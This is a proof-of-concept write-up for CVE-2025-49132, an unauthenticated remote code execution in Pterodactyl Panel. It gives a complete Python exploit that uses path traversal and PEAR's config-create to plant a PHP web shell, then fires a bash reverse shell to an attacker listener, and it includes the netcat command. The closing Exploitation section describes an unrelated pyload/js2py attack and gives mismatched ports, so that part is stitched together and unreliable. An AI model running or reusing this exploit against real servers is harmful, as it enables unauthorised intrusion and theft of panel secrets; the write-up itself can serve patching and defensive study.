# CVE-2025-49132: Unauthenticated Remote Code Execution in Pterodactyl Panel (< 1.11.11)

## Summary

Pterodactyl Panel versions before 1.11.11 are vulnerable to a pre-authentication remote code execution vulnerability through the `/locales/locale.json` endpoint. By abusing the `locale` and `namespace` query parameters, an attacker can direct the panel's localization loader to resolve a path outside its intended directory, reaching PHP's `pearcmd.php` utility. From there, the `config-create` option available in `pearcmd.php` can be misused to write attacker controlled content to disk, including a small PHP web shell. Once that file lands inside a web accessible directory, it can be requested directly to execute arbitrary system commands.

This PoC demonstrates the full chain, from writing the web shell to disk, to getting a reverse shell back on a listener, on a Pterodactyl Panel instance running a version prior to 1.11.11.

## Why this bug matters

The panel is not just another web app in the stack. It typically holds the `.env` file with database credentials, SMTP credentials, and API tokens, and it has management access to every game server or container it controls. An attacker who reaches code execution on the panel host does not just get a shell on one box, they get a foothold that can pivot into the database, into secrets, and into everything the panel is allowed to manage. Combine that with the fact that no login is required to trigger the bug, and this becomes the kind of finding that gets prioritized the same day it is discovered rather than sitting in a backlog.

The root of the issue comes down to how the locale endpoint builds a filesystem path from user input. `locale` and `namespace` are meant to select a language file for the UI, but neither value is properly restricted before being used to build that path. Directory traversal sequences in `locale` let an attacker walk out of the expected locales folder, and pointing `namespace` at `pearcmd` lets them reach PEAR's command line installer script, which was never meant to be invoked this way over HTTP. PEAR's `config-create` command happens to take a path and writes a file there with content the attacker controls, which is the exact primitive needed to drop a web shell.

## Environment

This was tested against a self hosted Pterodactyl Panel instance already deployed and reachable in an isolated lab environment set up specifically for this test. The panel was running a version prior to the 1.11.11 patch, with PHP and PEAR installed as part of the default panel stack, which is the case for most standard installs. No credentials, panel account, or prior access of any kind were used, the entire chain starts from an unauthenticated HTTP request.

Two things are assumed as already in place before running the exploit:

- A working Pterodactyl Panel install, vulnerable version, reachable over HTTP on the attacking machine's network.
- A listener box ready to catch the reverse shell, with the IP and port passed to the script at runtime.

If someone else needs to reproduce this from zero, the only real prerequisite is standing up a vulnerable panel instance and confirming `/locales/locale.json` responds, everything past that point is handled by the script.

## Code walkthrough

The PoC is a single Python script, `exploit.py`, built around two functions that map directly to the two stages of the attack: writing the web shell, then triggering it for a reverse shell.

### Imports and arguments

```python
import argparse
import requests
from pwn import *

proxy = {'http':'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser()
parser.add_argument("-url", help="url", required=True)
parser.add_argument("-lhost", help="lhost", required=True)
parser.add_argument("-lport", help="lport", required=True)
args = parser.parse_args()
```

The script uses `requests` for the second stage HTTP request and pulls in `pwntools` (`from pwn import *`) for the raw socket handling used in the first stage. Three arguments are required at runtime: `-url` for the target panel, `-lhost` and `-lport` for the listener that will catch the reverse shell. The `proxy` dictionary is set up to route the RCE request through a local proxy on port 8080, which is useful during testing since it lets every request be inspected in Burp before it goes out, though it is only actually used in the `rce()` function.

### `exploit()`: writing the web shell

```python
def exploit():
    print(f"[+] Uploading Web Shell on {args.url}...")
    conn = remote(args.url, 80)
    request = f"GET /locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/<?=system($_GET[0])?>+/tmp/cmd.php HTTP/1.1\r\n"
    request += f"Host: {args.url}\r\n"
    request += "Connection: close\r\n\r\n"
    conn.send(request.encode())
    response = conn.recvall().decode()
    conn.close()
    print("Successfully created default configuration file \"/tmp/cmd.php\"")
```

This function opens a raw TCP connection to the target on port 80 using pwntools' `remote()`, then sends a hand built HTTP GET request rather than going through a library like `requests`. The reason a raw socket is used here instead of `requests` is that the payload in the query string is not valid as a normal URL, it contains raw spaces and PHP code, and `requests` would try to encode those characters before sending, which would break the exploit. Building the request manually and sending it straight over the socket avoids any of that automatic encoding.

Breaking down the actual query string:

- `locale=../../../../../../usr/share/php/PEAR` walks the path back far enough to escape the panel's locales directory and lands inside PEAR's own directory on the filesystem.
- `namespace=pearcmd` tells the endpoint to load `pearcmd.php` from that resolved path, which is PEAR's command line front controller.
- The remainder, `+config-create+/<?=system($_GET[0])?>+/tmp/cmd.php`, is passed through as arguments to `pearcmd.php` once it is invoked. `config-create` is a legitimate PEAR command that writes a configuration file to a path you give it, and normally it just writes PEAR config values. Here, the "path" argument is swapped out for a short PHP one liner, `<?=system($_GET[0])?>`, and the second argument, `/tmp/cmd.php`, becomes the actual output file. PEAR ends up writing that PHP snippet to `/tmp/cmd.php` on the server without validating what it was asked to write.

The result is a minimal web shell sitting at `/tmp/cmd.php` on the target, where any GET parameter named `0` gets passed straight into `system()`.

### `rce()`: triggering the shell for a reverse connection

```python
def rce():
    url = f"http://{args.url}/locales/locale.json?locale=../../../../../../tmp&namespace=cmd&0=bash+-c+%22bash+-i+%3E%26+/dev/tcp/{args.lhost}/{args.lport}+0%3E%261%22"
    print(f"[+] Sending the RCE to {args.lhost}...")
    r = requests.get(url, proxies=proxy)
    if r.status_code == 500:
        print("[+] RCE exploited :>")
    else:
        print(f"[-] Failed: {r.status_code}")
```

This second function reuses the exact same `locale.json` endpoint, but this time to actually reach and execute the shell that was just planted. `locale=../../../../../../tmp` traverses to the `/tmp` directory, and `namespace=cmd` resolves to the file already dropped there, `/tmp/cmd.php`, since the earlier PEAR command effectively named it `cmd.php` in that directory. The `0` parameter is what the web shell's `system($_GET[0])` picks up, and its value is a standard bash reverse shell one liner, `bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"`, URL encoded so the special characters survive transit as an actual `requests.get()` call this time.

The status code check at the end is a simple heuristic rather than a guarantee. A 500 here usually shows up because the PHP process handling the request hangs or errors out once the reverse shell spawns and the original HTTP response never completes cleanly, so it is used as a rough signal that the command executed rather than proof by itself. The real confirmation is watching the listener catch the connection.

### `exploit()` then `rce()`

```python
exploit()
rce()
```

The script runs both stages back to back with no delay or check in between. In practice this worked fine in this environment because the file write in `exploit()` completes and returns before the socket is closed, but it is worth knowing there is no explicit wait or verification step confirming `/tmp/cmd.php` actually exists before `rce()` fires its request at it.

---

Exploitation

Before running the script, a netcat listener was started on the attacker machine to catch the reverse shell:

nc -nlvp 4444

With the listener up, the POC was run against the target with the attacker's IP and port, along with a throwaway username and password to register on the pyload instance:

python3 exploit.py -url <url> -lhost 10.10.14.4 -lport 4445


<img width="770" height="160" alt="image" src="https://github.com/user-attachments/assets/e287166a-9650-46cd-bb75-5d0facf9df6b" />

As soon as the exploit request went out, the listener caught the callback and dropped into a shell on the target as the app user.

<img width="678" height="131" alt="image" src="https://github.com/user-attachments/assets/b2323143-58e7-4212-804d-45bf64cdb0a4" />

Request flow in Burp Suite

Since the script routes everything through a local proxy, the full request chain was also captured in Burp for verification. This shows the register, login, and run_code requests hitting the target in sequence, along with the session cookie picked up after login and reused for the final exploit request.

<img width="1892" height="154" alt="image" src="https://github.com/user-attachments/assets/20a2e668-e2fd-4044-b364-f25bdd51b7dd" />

Together these three pieces (script output, shell access, and the underlying HTTP requests in Burp) confirm the full chain: registering a session, authenticating, and using that session to reach /run_code with a payload that escapes the js2py sandbox and executes arbitrary commands on the host.
